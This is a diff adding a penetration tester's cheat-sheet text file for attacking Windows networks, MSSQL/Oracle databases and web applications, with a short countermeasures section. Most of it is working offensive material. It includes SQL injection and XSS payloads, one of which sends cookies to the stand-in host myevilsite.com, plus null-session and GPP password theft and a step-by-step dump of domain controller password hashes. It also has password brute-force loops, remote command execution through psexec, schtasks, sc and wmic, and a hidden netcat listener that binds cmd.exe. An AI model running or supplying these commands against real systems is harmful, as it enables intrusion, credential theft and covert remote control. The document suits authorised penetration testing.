@@ -1,0 +1,523 @@
+********************************************************************************************************
+Reconnaissance 
+********************************************************************************************************
+nslookup - windows zone transfer
+	set type=any
+	ls -d [target_domain] [> filename]
+	view [filename]
+
+********************************************************************************************************
+Databases 
+********************************************************************************************************
+Ports
+	MS SQL - TCP 1433
+		 UDP 1434
+		nmap -sP -p 1433 x.x.x.x/x
+		nmap -sU -p 1434 x.x.x.x/x
+	Oracle - TCP 1521
+		nmap -sP -p 1521 x.x.x.x/x
+
+Sites with good DB Pen Testing Tools:
+	Oracle	- www.petefinnigan.com/index.htm
+	MS SQL  - www.sqlsecurity.com
+
+*********************
+MSSQL
+*********************
+
+SQLPing3 -	Windows tool that performs both active and passive scans of your network in order to 
+		identify all of the SQL Server/MSDE installations on your network
+		http://www.sqlsecurity.com
+
+SQL Server Versions:
+	SQL Server 7.0 RTM  	7.00.623
+	SQL Server 7.0 SP1	7.00.699
+	SQL Server 7.0 SP2	7.00.842	
+	SQL Server 7.0 SP3	7.00.961
+	SQL Server 7.0 SP4	7.00.1063	
+
+	SQL Server 2000 RTM	2000.80.194.0	use metasploit- exploit:  windows/mssql/ms02_039_slammer
+								payload:  win32_reverse 
+									windows/shell/reverse_http             
+									windows/shell/reverse_ord_tcp       
+									windows/shell/reverse_tcp           
+									windows/shell_bind_tcp              
+									windows/shell_reverse_tcp           
+	SQL Server 2000 SP1	2000.80.384.0
+	SQL Server 2000 SP2	2000.80.534.0
+	SQL Server 2000 SP3	2000.80.760.0
+	SQL Server 2000 SP3a	2000.80.760.0
+	SQL Server 2000 SP4	2000.8.00.2039
+
+	SQL Server 2005 RTM	2005.90.1399
+	SQL Server 2005 SP1	2005.90.2047
+	SQL Server 2005 SP2	2005.90.3042
+
+SA Exploiter - 	The most advanced GUI tool for aiding in full compromises of MSSQL servers via SQL 
+		injection.  Whether it is copy/paste of metasploit shellcode or using your own custom
+		exe, SA Exploiter's binary payload delivery method is not constrained by Windows debug 
+		to 64k like many other tools
+		http://securestate.com/Pages/SA-Exploiter.aspx
+
+
+*********************
+Oracle
+*********************
+
+TNSLSNR - verifies the existence of the Oracle listener on a server
+	Windows Client:
+		http://dokfleed.net/files/audit/OracleTNSLSNR.exe
+			Commands Supported:
+				ping, version, service, status change_password,help, reload,
+				save_config, set connect_timout, set display_mode, set log_directory, 
+				set log_file, set log_status, show, spawn stop 
+	Perl Version:
+		/usr/local/bin/tnscmd.pl
+			Command Supported:
+				ping, version, service, status change_password,help, reload,
+				save_config, set connect_timout, set display_mode, set log_directory, 
+				set log_file, set log_status, show, spawn stop 
+		Can also be aquired from:
+			http://dokfleed.net/files/audit/tnscmd2.zip
+	10G Perl Version:
+		http://dokfleed.net/files/audit/tnscmd10g.zip
+			copy to /usr/local/bin after download
+
+Oracle Auditing Tools - a collection of tools that can be used for pen testing of an Oracle DB
+	Both Windows and Linux versions exist of the following tools
+	Use the following command to aquire the SIDs:
+		sh /pentest/database/oracle/oat/otnsctl.sh -s 10.1.1.1 -P 1521 -c status
+			-s   Server name or IP address
+			-P   Port number (usually 1521)
+			-c   Command (ping, version, services, status)
+			-I   Interactive mode
+			-v   Verbose output
+		Can also be aquired from:
+			http://www.cqure.net/tools/oat-binary-1.3.1.zip
+
+	Use the following command to enumerate Users in the Oracle DB
+		Modify the oscanner.sh file and include the path to java (i.e. /usr/bin/java)
+		sh /pentest/database/oracle/oscanner_bin/oscanner.sh -s 10.1.1.1
+			-s   Server name or IP address
+			-P   Port number
+			-f   server list, for scannng multiple server
+			-v   verbose output
+OScanner Report Viewer:
+		OScanner automatically creates a report that this Report Viewer can open
+		The Accounts in the report that have a red X next to them are accounts that are
+			unlocked and in the default configuration or using well-known passwords.
+			i.e sys account has the password 'sys'
+		Modify the reportviewer.sh file and include the path to java (i.e. /usr/bin/java)
+		sh /pentest/database/oracle/oscanner_bin/reportviewer.sh 10.1.1.1
+
+
+Oracle Enterprise Manager Console - download from oracle.com
+	Select Tools | Database Applications | SQL*Plus Worksheet
+		File | Change Database Connection
+			Use the account and password for SYS
+		Dump the user name and password hashes:
+			select name,password from sys.user$ where type#=1;
+			Crack the passwords using a tool called orabf
+				http://www.tool-crypt.org/tools/orabf/index.html
+
+********************************************************************************************************
+Web Server Testing
+********************************************************************************************************
+
+thcsslcheck	Windows tool that checks the remote ssl stack for supported ciphers and version.
+		http://freeworld.thc.org/root/tools/
+
+ssldigger	assess the strength of SSL servers by testing the ciphers supported.  Requires .NET
+		http://www.foundstone.com/us/resources/proddesc/ssldigger.htm
+
+httprint	web server fingerprinting tool
+		http://net-square.com/httprint/
+			httprint -h 192.208.27.4 -s /pentest/web/httprint/signatures.txt
+
+wikto		CGI scanning tool.  Requires .NET, httprint (above),Google API (api.google.com), and
+		nikto and HTTrack
+			http://www.sensepost.com/research/wikto/
+			Launch wikto
+				Select the "BackEnd" tab -> set the IP/DNS name of the target
+				Click "Start Mining"
+				Select the "Wikto" tab -> click "Import from BackEnd"
+					Add the IP Address of the target and select "AI"
+				Click "Start Wikto"
+
+
+Live HTTP Headers	Plugin for Mozilla-based browsers that allows you to examine the last
+		request submitted in your browser...and then modify/replay it
+		http://livehttpheaders.mozdev.org/installation.html
+
+
+SQL Injection:
+    30000' select name from sysobjects--
+    30000' select name from syscolumns--
+    30000' exec sp_makewebtask '
+    30000' ; exec xp_cmdshell --
+    30000' having 1=1--
+ 
+SQL injection tools:
+    Scrawlr
+    SQL Buddy
+    SQL Power Injector
+    SQL Map
+ 
+Encoding and Decoding
+    Encoder/Decoder   
+    Cain and Able
+ 
+XSS
+    <script>alert(123)</script>
+    <script>alert(document.cookie)</script>
+    document.write('<img src='http://myevilsite.com?' + document.cookie + '>');
+ 	This takes the cookie already loaded in my browser and sends it to the "myevilsite.com" as an
+	image request.
+
+
+FOCA	This tool will analyze metadata from Microsoft Office Documents, PDF files, Open Office Files 
+	and Word Perfect files, EXIF Metadata out of images and the best part is that you can add the 
+	files you collected manually or found and downloaded thru web searches using Google and Live 
+	Search witch makes it extremely flexible for pentests. it will enumerate Users, Folders, 
+	Printers, Emails and the version of Software used to create the file.
+	http://www.informatica64.com/foca/
+    
+    Instructions:
+	http://www.darkoperator.com/blog/2009/4/24/metadata-enumeration-with-foca.html#comments
+	1.  You can press Project Ð> New Project and start a new project where you give the Project Name, 
+	the Website to enumerate for documents and a give it a place to download and store the documents.
+	2.  You can also instead choose to add a single file or folder of files that you have gathered 
+	previously via email, social engineering or any other way by Righ-Clicking with the mouse on 
+	the  document list area and choose either the Add File or Add Folder option.
+	3.  Select Which search engines and which extensions to use.  Click custom search if the file 
+	type you want is not listed and enter the extension.  i.e  filetype:jpg OR filetype:gif OR ...
+	4.  Hit search and you can see the files that where found, one it has finish you can right 
+	click and download only specific files of choose to download them all.  Once Downloaded you 
+	can righ-click again on them and choose to extract the metadata of a single file or select to 
+	extract the metadata of all the files.
+	5.  Once it has finished extracting all the metadata you can look at it by clicking on the 
+	type or go to Documents select the document and click on it to get even more information 
+	not classified in the types given like EXIF data.  For example you might click on the folder 
+	tab and you can see it can identify usernames, location, servers and paths on the network of 
+	where these documents where created and stored
+	6.  This information can be exported to a text file by right-clicking on the attribute and 
+	choosing to export data to a file, this can later be used to feed the data in to other tools 
+	or to gain information for further attacks like finding types of printers that can be used to 
+	store files or exploit since embedded device security tends to be low, or attack shares by 
+	dropping office documents with Meterpreter VBA shells or setting autirun.ini files to launch 
+	payloads or exploits on client PCÕs, The options are many.
+
+
+********************************************************************************************************
+Exploits, bruteforce, etc. 
+********************************************************************************************************
+Windows
+	MS-RPC-DCOM: 	MS 03-026
+	LSASS:		MS 04-11
+	uPNP:		MS 05-039
+	RRAS:		MS 06-025
+	Server Service:	MS 06-040
+	Server Service:	MS 08-067
+
+Windows-Privesc-check	Standalone executable that runs on Windows systems (tested on XP, Windows 7 only 
+	so far). It tries to find misconfigurations that could allow local unprivileged users to escalate 
+	privileges to other users or to access local apps (e.g. databases).
+	http://pentestmonkey.net/tools/windows-privesc-check
+
+Data Backup Products
+	Veritas
+	CA Brightstor
+	Arkeia
+
+VNC	Authentication Bypass
+
+Dictionary Generator tool for windows
+	www.fonlow.com/zijianhuang/kpa
+
+Example Password = ApPLe
+LANMAN Hash	 = APPLE
+lm2ntcrack	 - input clear text LANMAN (all caps) password and the 
+		   ciphertext NT hash
+		   Included in metasploit
+		   http://www.xmcopartners.com/lm2ntcrack
+
+
+lockoutstatus.exe - tool from Microsoft that pulls info about locked out 
+		    accounts in Active Directory
+
+
+******
+Non-auth to local admin in 3 steps:
+net use \\server\ipc$ "" /u:""
+
+Nullsession:
+net use \\dc\ipc$ "" /u:""
+
+Search for cpasswords in gpo's:
+dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword >> dump.txt
+
+Decrypt the cPassword
+gpp-decrypt <string>
+******
+
+
+net accounts	- see settings for account lockout
+net accounts /domain	-see settings for account lockout in a domain
+
+wmic useraccount list brief	-shows all accounts with their SID's
+
+Active Directory domain controllers store account information, including LANMAN
+	and NT Hashes in %systemroot%\ntds\ntds.dit
+
+
+fgdump.exe	dump hashes from windows boxes
+		remotely disables AV; dumps cached credentials
+		http://swamp.foofus.net/fizzgig/fgdump/downloads.htm
+		To remotely dump the hash as the Administrator user (Admin account must be used)
+		fgdump.exe -h 192.168.0.10 -u Administrator
+
+
+Safely Dumping Hashes from Live Domain Controllers
+	1. Create a new Shadow Copy.
+	get vssown.vbs: http://tools.lanmaster53.com/vssown.vbs
+	cscript vssown.vbs /start (optional)
+	cscript vssown.vbs /create
+
+	2. Pull the following files from a shadow copy:
+	copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .
+	copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .
+	copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .
+
+	3. Copy files to BT5R1.
+
+	2. Download tools from:
+	http://csababarta.com/downloads/ntds_dump_hash.zip
+
+	3. Configure and Make the source code for libesedb from the extracted package.
+	cd libesedb
+	chmod +x configure
+	./configure && make
+
+	4. Use esedbdumphash to extract the datatable from ntds.dit.
+	cd esedbtools
+	./esedbdumphash ../../ntds.dit
+
+	5a. Use dsdump.py to dump the hashes from the datatable using the bootkey from the SYSTEM hive.
+	cd ../../creddump/
+	python ./dsdump.py ../SYSTEM ../libesedb/esedbtools/ntds.dit.export/datatable
+
+	5b. Use bkhive and samdump2 to dump the hashes from the SAM file using the bootkey from the SYSTEM hive.
+	bkhive SYSTEM key.txt
+	samdump2 SAM key.txt
+
+	6. Crack the hashes.
+
+	Beautiful right? But we're not done yet. Csaba also created a tool called dsdumphistory.py which dumps 
+	the PAST hashes of all the users as well. Now you can crack the historical passwords of users and 
+	identify patterns in their password history.
+
+	python ./dsdumphistory.py ../system ../libesedb/esedbtools/ntds.dit.export/datatable
+
+	So what exactly does this mean? No more dangerous LSSAS injection to dump domain hashes and no more drive 
+	mounting to access locked and protected system files. 
+
+
+********************************************************************************************************
+Some Counter Measures
+********************************************************************************************************
+OS Lockdown help
+	http://csrc.nist.gov/itsec/guidance_WinXP.html
+	http://www.cisecurity.org/
+	http://www.cisecurity.org/bench_windows.html
+	http://www.bastille-unix.org
+
+
+Internet Explorer:
+	Check "Check for server certificate revocation(requires restart)
+		Forces IE to go to CA to check authenticity of the Cert being issued
+
+URLScan	Microsoft tool for checking IIS and change the Banner in IIS
+
+Free Anti-Virus:
+	http://free.avg.com/us-en/homepage
+	http://www.clamwin.com/
+
+Root Kit Detection:
+	RUBotted by TrendMicro
+	BlackLight by F-Secure
+	Rootkit Revealer by Sysinternals/Microsoft
+	GMER
+	UnHackMe by Greatis
+	
+
+Self-Signed IIS SSL Certificates using OpenSSL
+   1. Set up your CA (you only have to do this once)
+      ON THE LINUX BOX...
+          * Create a private key
+                openssl genrsa -des3 -out CA.key 1024
+          * Create the CA certificate
+                openssl req -new -key CA.key -x509 -days 1095 -out CA.crt
+
+   2. Obtain a CSR
+      ON THE IIS BOX...
+          * Open the Internet Manager
+          * Select the site for which you want to create a key
+          * Right-click and choose Properties
+          * Select the "Directory Security" tab
+          * Click the "Server Certificate" button
+          * Follow the prompts to create a CSR
+          * Save your CSR, then transfer it to the Linux box for further processing. 
+
+   3. Sign the CSR
+      ON THE LINUX BOX...
+          * Sign the CSR (all of this on one line)
+                openssl x509 -req -days 365 -in new.csr -CA CA.crt 
+		   -CAkey CA.key -CAcreateserial -out new.crt
+          * Transfer the new.crt file back to the IIS box
+
+   4. Install self-signed certificate
+      ON THE IIS BOX...
+          * Open the Internet Manager
+          * Select the site to install the key
+          * Right-click and choose properties
+          * Select the "Directory Security" tab
+          * Click the "Server Certificate" button
+          * Specify that you want to complete the pending request
+          * Select the .crt file that you just transferred
+
+    That's it!
+
+********************************************************************************************************
+Cool shit I didn't know where else to put
+********************************************************************************************************
+
+Cain & Abel	Windows Only -Detects access points, ARP poisoning, decode VoIP, 
+		ennumerate shares
+		You can MITM RDP Sessions and capture output from them (including keystrokes)
+			Stores in C:\Program files\Cain\RDP
+			Try IronGeekÕs output parser for typed commands: http:// 
+			www.irongeek.com/i.php?page=security/cain-rdp-mitm-parser 
+		Does VOIP Sniffing - Converts and dumps RTP streams to WAV
+
+Network Miner	Load in cap files from tcpdump or wireshark and it breaks it down in a very slick and
+		easy to read format.  This is the bomb digity!
+
+Methods for pulling accounts
+	Windows - pulling user lists and/or SIDS can be accomplished:
+	1. pull user lists from Null SMB sessions
+		net use \\targetIP "" /u:""
+	2. User2sid and Sid2user
+		These 2 commands,plus anon above will give you sids:
+		user2sid \\[targetIP] [machine_name]	#Get the SID w/out S-1-
+		for /L %i in (1000,1,1010) do @sid2user \\[trgtIP] [SID-RID] %i
+			replace dashes with spaces
+
+	enum -U [targetIP]  	#list users
+	enum -G [targetIP]	#list groups
+
+Echo Mirage 	Generic Application/Network proxy. It uses DLL injection and function hooking techniques to redirect
+		network related function calls so that data transmitted and received by local
+		applications can be observed and modified
+		http://echo-mirage.software.informer.com/download/
+
+********************************************************************************************************
+Windows Command line KungFu
+********************************************************************************************************
+	[command1] & [command2] 	Run multiple commands 
+		
+	[command1] && [command2] 	Run command1 and only run command 2 if 
+					command1 succeeds without error
+
+	@ping				turn off echoing of the command after@
+
+	[command] 2>nul			standard error go away
+
+	[command] 2>>errorfile.txt	append error messages to file
+
+	echo.				print blank line.  No space
+
+	echo CTRL-G			Make a beep.  will be shown as ^G
+
+	Password guessing with FOR /F
+		for /F %i in (password.lst) do @echo %i & @net use \\[targetIP] %i /u:[UserName] 2>nul && pause
+	
+		for /F %i in (password.lst) do @echo %i & @net use \\[targetIP] %i /u:[UserName] 2>nul && echo UserName: %i >> success.txt
+
+
+script for brute force login and password
+echo off
+for /F %%i in (users.txt) do (
+  for /F %%j in (pass.txt) do (
+     net use \\10.10.10.10 %%j /u:%%i && (net use \\10.10.10.10 /del & @echo %%i %%j >> success.txt)
+  )
+) 2>nul
+
+
+psexec
+	psexec \\[targetIP] [-d] [-u user] [-p password] [command]
+	-s	run with local SYSTEM privileges
+	-d	run detached (in background, no interaction with Standard Input
+		or Standard Output
+	-u	if not specified, pass thru auth is used
+	psexec \\10.10.10.10 cmd.exe
+
+at and schtasks
+	first establish a session with admin privileges
+	net use \\[targetIP] [password] /u:[admin user]
+	sc \\[targetIP] query schedule
+	sc \\[targetIP] start schedule
+	schtasks /create /tn [taskname] /s [targetIP] /u [user] /p [passwd] /sc once
+		[frequency] /st [starttime] /sd [startdate] /tr [command]
+	To run command as SYSTEM replace /u and /p with "/ru SYSTEM"
+	schtasks.exe /create /tn cmd /ru system /st 15:09 /sd 12/13/2018 /tr cmd.exe /sc once
+
+
+sc	service controller.  Lets account with admin privileges interact with 
+	services, querying their status, activating them and stopping them
+	sc query
+	sc query state= all
+	sc \\[targetIP] query
+	sc qc [service_name]
+	sc start [service_name]
+	sc config [service_name] start= demand
+	sc stop [service_name]
+	
+Use sc to invoke an executable
+	net use \\1.1.1.1 [password] /u:[admin_user]
+	sc \\1.1.1.1 create [svcname] binpath= [command]
+	sc \\1.1.1.1 start [svcname]
+	Only runs for 30 seconds unless OS receives API from service indicating
+	the service started.  Since we don't have this we need a way around it.
+	Run this instead of the above:
+	sc \\1.1.1.1 create [svcname] binpath= "cmd.exe /k [command]"	
+	
+	ServifyThis - tool used to wrap an executable so that it throws the API
+		      call indicating successful service start.  It is a gui
+		      that you would use to build your service in a lab
+
+	Other handy sc commands:
+		sc \\1.1.1.1 delete [svcname]
+		sc \\1.1.1.1 query [svcname]
+
+
+WMIC
+	Run a program on a target immediately:
+		wmic /node: [targetIP] /user:[admin_user] /password:[password]
+			process call create [command]
+
+	List processes on a target:
+		wmic /node: [targetIP] /user:[admin_user] /password:[password]
+			process list brief
+
+	Kill a process by PID:
+		wmic /node: [targetIP] /user:[admin_user] /password:[password]
+			process where processid="[PID]" delete
+
+	Kill a process by name:	
+		wmic /node: [targetIP] /user:[admin_user] /password:[password]
+			process where name="[name]" delete
+
+Remotely create a netcat service listener that is invisible to user
+		wmic /node: [targetIP] /user:[admin_user] /password:[password]
+			process call create "c:\nc.exe -d -l -p 2222 -e cmd.exe"
+
